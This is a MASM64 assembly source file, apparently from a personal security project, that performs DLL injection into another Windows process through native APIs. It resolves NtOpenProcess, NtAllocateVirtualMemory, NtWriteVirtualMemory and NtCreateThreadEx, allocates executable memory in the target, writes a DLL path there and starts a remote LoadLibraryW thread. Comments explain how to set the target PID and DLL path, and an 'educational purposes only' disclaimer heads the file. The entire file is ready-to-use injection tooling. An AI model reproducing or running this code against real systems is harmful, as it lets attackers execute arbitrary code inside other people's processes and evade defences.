; /*
;
; > NTAPI Injection with MASM64 Assembly <
;
; @author: 0xCyberGenji
; @website:0xCyberGenji.github.io
; @warning: This project has been developed for educational purposes only. Its use in real scenarios is at one's own risk. 
;
; */


includelib ".\lib\user32.lib"
includelib ".\lib\kernel32.lib"

extern GetModuleHandleW:PROC 
extern GetProcAddress:PROC
extern WriteConsoleA:PROC  
extern ExitProcess:PROC
extern WaitForSingleObject:PROC 

OBJECT_ATTRIBUTES STRUCT
    oLength                  QWORD ?
    RootDirectory            QWORD ?
    ObjectName               QWORD ?
    Attributes               QWORD ?
    SecurityDescriptor       QWORD ?
    SecurityQualityOfService QWORD ?
OBJECT_ATTRIBUTES ENDS

CLIENT_ID STRUCT
    UniqueProcess            DWORD ?
    UniqueThread             QWORD ?
CLIENT_ID ENDS

.data     
    ; Set the ID of the target Process here. 
    PID                         equ 0        
    objAttr OBJECT_ATTRIBUTES   <> 
    CID     CLIENT_ID           <>

    hProcess                    QWORD 0
    hThread                     QWORD 0
    rBuffer                     QWORD 0
    wLoadLibrary                QWORD ?
    dllSize                     QWORD 0
    

    ntOpenStr                   db "NtOpenProcess",0
    NtOpenProcess               dw 0

    ntVirtualStr                db "NtAllocateVirtualMemory",0
    NtAllocateVirtualMemory     dw 0

    ntWriteStr                  db "NtWriteVirtualMemory",0
    NtWriteVirtualMemory        dw 0

    ntCreateStr                 db "NtCreateThreadEx",0
    NtCreateThreadEx            dw 0

    ntCloseString               db "NtClose",0 
    NtClose                     dw 0
    
    loadLibraryStr              db "LoadLibraryW",0
    LoadLibraryWAddr            dw 0     
    
    ; You need to enter it separating the characters as shown below. Otherwise you will not be able to execute the DLL.  
    ; Remember that this is a DWORD variable! If you try to convert the DB you will not be able to execute the dll in any way.  
    ; For example, if your dll is in C:, you need to set the variable as follows:
    ; dllPath DW 'C',':','\','b','e','k','o','o','.','d','l','l',0  ; L"C:\bekoo.dll"
    dllPath                     DW    'p','a','t','h','\','t','o','\','d','l','l',0
    ntDLL                       dw 'n','t','d','l','l','.','d','l','l',0
    hKernel32                   DW 'k','e','r','n','e','l','3','2',0
    
.code 

GetTargetProc PROC 
    mov r15,[rsp]
    
    mov rdx,rsi
    mov rcx,rax
    call GetProcAddress

    cmp rax,0 
    je _returnToCleanup

    cmp rbx,0
    je _returnToMain 

    mov [rbx],rax 

    _returnToMain:
        mov [rsp],r15
        ret     

    _returnToCleanup:
        jmp CLEANUP
GetTargetProc ENDP 

mainCRTStartup PROC 
    push rbp
    mov rbp, rsp
    sub rsp, 40h  
    xor rax,rax
    mov [rbp + 80h],rax
       
    ;* CLIENT_ID           CID         = { (HANDLE)PID, NULL };
    mov CID.UniqueProcess,PID
    mov CID.UniqueThread,0 

    ;* OBJECT_ATTRIBUTES   objAttr     = { sizeof(objAttr), NULL };    
    mov objAttr.oLength,0    
    mov objAttr.RootDirectory,0    
    mov objAttr.ObjectName,0    
    mov objAttr.Attributes,0    
    mov objAttr.SecurityDescriptor,0    
    mov objAttr.SecurityQualityOfService,0    
    mov objAttr.oLength,sizeof OBJECT_ATTRIBUTES 

    ;* HMODULE GetModuleHandleW(
    ;*      [in, optional] LPCWSTR lpModuleName
    ;* ); 
    lea rax,hKernel32
    mov rcx,rax 
    call GetModuleHandleW

    lea rsi,loadLibraryStr
    lea rdx,LoadLibraryWAddr
    lea rbx,[wLoadLibrary]
    call GetTargetProc

    lea rax, ntDLL
    mov rcx, rax
    call GetModuleHandleW
    mov [rbp+80h], rax

    lea rsi,ntOpenStr
    lea rdx,NtOpenProcess
    xor rbx,rbx 
    call GetTargetProc

    ;* typedef NTSTATUS(NTAPI* fn_NtOpenProcess) (
    ;*      OUT PHANDLE ProcessHandle,
    ;*      IN ACCESS_MASK DesiredAccess,
    ;*      IN POBJECT_ATTRIBUTES ObjectAttributes,
    ;*      IN PCLIENT_ID ClientId OPTIONAL
    ;* );
    lea r8,objAttr                  ; ObjectAttributes
    lea r9,CID                      ; CLientId
    mov edx,1FFFFFh                 ; DesiredAccess
    lea rcx,hProcess                ; ProcessHandle
    call rax 

    cmp rax,0
    jnz CLEANUP

    lea rsi,ntVirtualStr
    lea rdx,NtAllocateVirtualMemory
    mov rax,[rbp+80h]
    xor rbx,rbx 
    call GetTargetProc

    ;* typedef NTSTATUS(NTAPI* fn_NtAllocateVirtualMemory) (
    ;*      IN HANDLE ProcessHandle,
    ;*      IN OUT PVOID* BaseAddress,
    ;*      IN ULONG ZeroBits,
    ;*      IN OUT PSIZE_T RegionSize,
    ;*      IN ULONG AllocationType,
    ;*      IN ULONG Protect
    ;* );
    mov rcx,sizeof dllPath 
    mov dllSize,rcx 
    mov dword ptr [rsp + 28h],40h   ; Protect
    mov dword ptr [rsp + 20h],3000h ; AllocationType
    lea r9,dllSize                  ; RegionSize
    mov r8d,0                       ; ZeroBits
    lea rdx,rBuffer                 ; BaseAddress
    mov rcx,hProcess                ; ProcessHandle    
    call rax 

    cmp rax,0
    jnz CLEANUP

    lea rsi,ntWriteStr
    lea rdx,NtWriteVirtualMemory
    mov rax,[rbp+80h]
    xor rbx,rbx 
    call GetTargetProc

    ;* typedef NTSTATUS(NTAPI* fn_NtWriteVirtualMemory) (
    ;*      IN HANDLE ProcessHandle,
    ;*      IN PVOID BaseAddress,
    ;*      IN PVOID Buffer,
    ;*      IN SIZE_T NumberOfBytesToWrite,
    ;*      OUT PSIZE_T NumberOfBytesWritten OPTIONAL
    ;* );
    mov qword ptr [rsp + 20h],0     ; NumberOfBytesWritten
    mov r9,sizeof dllPath           ; NumberOfBytesToWrite
    lea rcx,dllPath                 
    mov r8,rcx                      ; Buffer
    mov rdx,rBuffer                 ; BaseAddress
    mov rcx,hProcess                ; ProcessHandle
    call rax    

    cmp rax,0
    jnz CLEANUP

    lea rsi,ntCreateStr
    lea rdx,NtCreateThreadEx
    mov rax,[rbp+80h]
    xor rbx,rbx 
    call GetTargetProc


    ;* typedef NTSTATUS(NTAPI* fn_NtCreateThreadEx) (
    ;*      OUT PHANDLE ThreadHandle,
    ;*      IN ACCESS_MASK DesiredAccess,
    ;*      IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    ;*      IN HANDLE ProcessHandle,
    ;*      IN PVOID StartRoutine,
    ;*      IN PVOID Argument OPTIONAL,
    ;*      IN ULONG CreateFlags,
    ;*      IN SIZE_T ZeroBits,
    ;*      IN SIZE_T StackSize,
    ;*      IN SIZE_T MaximumStackSize,
    ;*      IN PPS_ATTRIBUTE_LIST AttributeList OPTIONAL
    ;* );
    mov rdx,rBuffer 
    mov r8,hProcess  
    lea rcx,objAttr    
    mov qword ptr [rsp + 50h],0     ; AttributeList
    mov qword ptr [rsp + 48h],0     ; MaximumStackSize
    mov qword ptr [rsp + 40h],0     ; StackSize
    mov qword ptr [rsp + 38h],0     ; ZeroBits
    mov dword ptr [rsp + 30h],0     ; CreateFlags
    mov qword ptr [rsp + 28h],rdx   ; Argument
    mov rdx,wLoadLibrary            
    mov qword ptr [rsp + 20h],rdx   ; StartRoutine
    mov r9,r8                       ; ProcessHandle
    lea r8,objAttr                  ; ObjectAttributes
    mov edx,1FFFFFh                 ; DesiredAccess
    lea rcx,hThread                 ; ThreadHandle
    call rax 

    cmp rax,0
    jnz CLEANUP

    ;* DWORD WaitForSingleObject(
    ;*      [in] HANDLE hHandle,
    ;*      [in] DWORD  dwMilliseconds
    ;* );
    mov edx,0FFFFFFFFh
    mov rcx,hThread
    call WaitForSingleObject

    jmp CLEANUP
mainCRTStartup ENDP 

CLEANUP PROC 
    mov rax,[rbp + 80h]
    cmp rax,0
    je _exit 

    ;* typedef NTSTATUS(NTAPI* fn_NtClose) (
    ;*      IN HANDLE Handle
    ;* );
    lea rsi,ntCloseString
    lea rdx,NtClose
    mov rax,[rbp+80h]
    xor rbx,rbx 
    call GetTargetProc
    mov [rbp + 100h],rax 

    CleanupHandleProcess:
        mov rcx,hProcess 
        cmp rcx,0       ; if (hProcess == 0)
        je CleanupHandleThread

        call rax 
    CleanupHandleThread:
        mov rcx,hThread 
        cmp rcx,0       ; if (hThread == 0)
        je _exit  

        mov rax,[rbp + 100h]
        call rax

    _exit:
        xor rcx,rcx 
        call ExitProcess
CLEANUP ENDP
END 
